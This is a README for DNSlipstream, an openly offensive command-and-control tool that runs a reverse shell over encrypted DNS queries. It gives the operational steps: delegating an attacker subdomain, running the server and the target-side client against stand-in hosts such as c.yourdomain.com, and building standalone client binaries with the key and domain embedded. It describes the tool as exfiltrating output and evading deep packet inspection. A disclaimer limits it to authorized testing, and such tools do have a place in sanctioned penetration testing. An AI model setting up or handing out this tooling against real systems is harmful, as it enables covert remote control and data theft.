# DNSlipstream

> DNS-tunneled reverse shell with end-to-end encryption and multi-session management.

DNSlipstream is a covert C2 (Command & Control) framework that tunnels a reverse shell over DNS queries. All traffic is encrypted using XSalsa20-Poly1305 (via PyNaCl) and serialized with Protocol Buffers, making it resilient to deep packet inspection and effective in environments where only DNS egress is permitted.

---

## How It Works

```
[Target Machine]                        [Attacker Machine]
  shell.py (client)                      serv.py (server)
       |                                       |
  Spawns /bin/sh or cmd.exe             Listens on UDP :53
       |                                       |
  stdout/stderr ──► encode()  ──► DNS TXT queries ──► parse_query()
  stdin          ◄── decode() ◄── DNS TXT replies ◄── packet_queue[]
```

Commands are sent from the server to the client via DNS TXT response records. Output is exfiltrated from the client back to the server as DNS queries. Each message is encrypted with a shared key (XSalsa20-Poly1305), authenticated, and fragmented into DNS-safe chunks.

---

## Features

- **DNS-tunneled reverse shell** — all I/O piped over DNS TXT queries/responses
- **End-to-end encryption** — XSalsa20-Poly1305 symmetric encryption via PyNaCl
- **Protobuf framing** — structured, compact wire protocol (`comm.proto`)
- **Multi-session management** — manage multiple clients simultaneously from one C2 server
- **Session persistence** — sessions are auto-saved to disk every 30 seconds and restored on server restart
- **Auto-completion CLI** — interactive `prompt_toolkit`-powered server shell with tab completion
- **Cross-platform client** — supports Windows (`cmd.exe`) and Linux/macOS (`/bin/sh`)
- **Standalone binaries** — build self-contained executables with embedded config via `build.py`
- **Multi-channel ready** — architecture supports A, AAAA, MX, CNAME record types (TXT fallback active)

---

## Requirements

```
pynacl>=1.5.0
protobuf>=4.21.0
dnslib>=0.9.23
prompt_toolkit>=3.0.36
dnspython>=2.3.0
cryptography>=41.0.0
cffi>=1.15.0
```

Install dependencies:

```bash
pip install -r requirements.txt
```

You also need `protoc` to compile the Protocol Buffer definition:

```bash
protoc --python_out=lib/protocol proto/comm.proto
```

---

## Setup

### 1. Generate an encryption key

```bash
python3 -c "from os import urandom; print(urandom(32).hex())"
```

### 2. Point a subdomain to your server

Configure your DNS zone so a subdomain (e.g., `c.yourdomain.com`) delegates to your server IP as an NS record. All DNS queries for that subdomain will hit your listener.

---

## Usage

### Running from source

**Server (attacker machine):**

```bash
export ENCRYPTION_KEY=<your_64_char_hex_key>
export DOMAIN_NAME=c.yourdomain.com
python3 cmd/server/serv.py
```

**Client (target machine):**

```bash
export ENCRYPTION_KEY=<same_key>
export TARGET_DOMAIN=c.yourdomain.com
python3 cmd/shell/shell.py
```

---

### Building standalone binaries

Use `build.py` with PyInstaller to produce self-contained executables with the key and domain embedded at build time:

```bash
# Build both client and server
python build.py all --domain c.yourdomain.com --key <64_char_hex_key>

# Build only the client
python build.py client --domain c.yourdomain.com

# Build only the server
python build.py server --domain c.yourdomain.com
```

If `--key` is omitted, a random key is generated and printed. Binaries are output to `dist/`:

| Binary | Description |
|---|---|
| `dist/dnslipstream` | Client (reverse shell agent) |
| `dist/dnslipstream-server` | Server (C2 listener + CLI) |

---

## Server CLI

Once the server is running, an interactive CLI is available:

```
shell >>> help
```

| Command | Description |
|---|---|
| `sessions` / `ls` | List all active sessions |
| `sessions <id>` / `use <id>` | Interact with a specific session |
| `save` | Manually persist sessions to disk |
| `restore` | Reload sessions from disk |
| `clear` | Delete all saved session data |
| `exit` | Shutdown the server |
| `background` | Return to main menu (during a session) |

Tab completion is available for commands and session IDs.

---

## Project Structure

```
DNSlipstream/
├── build.py                  # PyInstaller build script
├── requirements.txt
├── proto/
│   └── comm.proto            # Protobuf message definitions
├── cmd/
│   ├── server/
│   │   ├── serv.py           # DNS server + session manager
│   │   └── cli.py            # Interactive operator CLI
│   └── shell/
│       └── shell.py          # Reverse shell client
└── lib/
    ├── crypto/               # XSalsa20-Poly1305 encryption
    ├── transport/            # DNS stream, encoding, polling
    ├── spliting/             # Packet fragmentation
    ├── protocol/             # Compiled protobuf bindings
    ├── persistence/          # Session save/restore
    └── logging/              # Logging utilities
```

---

## Security Notes

- The encryption key must be identical on both client and server. It is embedded at build time or passed via environment variable — **never hardcode it in source**.
- All DNS packets are authenticated; unauthenticated or malformed queries are silently dropped with a `-` response.
- Sessions time out after 30 seconds of inactivity and are removed from memory.

---

## Disclaimer

DNSlipstream is intended for authorized penetration testing and security research only. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.

---

## License

See [LICENSE](LICENSE).
